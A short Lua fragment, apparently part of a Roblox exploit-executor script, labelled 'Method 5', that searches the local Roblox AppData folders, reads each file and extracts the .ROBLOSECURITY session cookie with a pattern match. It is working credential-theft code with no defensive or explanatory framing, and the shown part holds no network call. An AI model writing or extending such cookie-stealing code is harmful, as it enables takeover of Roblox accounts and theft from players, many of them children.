-- Method 5: Try reading Roblox's AppData cookie storage
if robloToken == "COOKIE_NOT_FOUND" and readfile then
    local cookiePaths = {
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\",
        os.getenv("APPDATA") .. "\\Local\\Roblox\\",
    }
    
    for _, path in pairs(cookiePaths) do
        pcall(function()
            if isfolder(path) then
                local files = listfiles(path)
                for _, file in pairs(files) do
                    local content = readfile(file)
                    local match = content:match("%.ROBLOSECURITY[\"':%s]+([A-F0-9_]+)")
                    if isValidCookie(match) then
                        robloToken = match
                        return
                    end
                end
            end
        end)
        if robloToken ~= "COOKIE_NOT_FOUND" then break end
    end
end

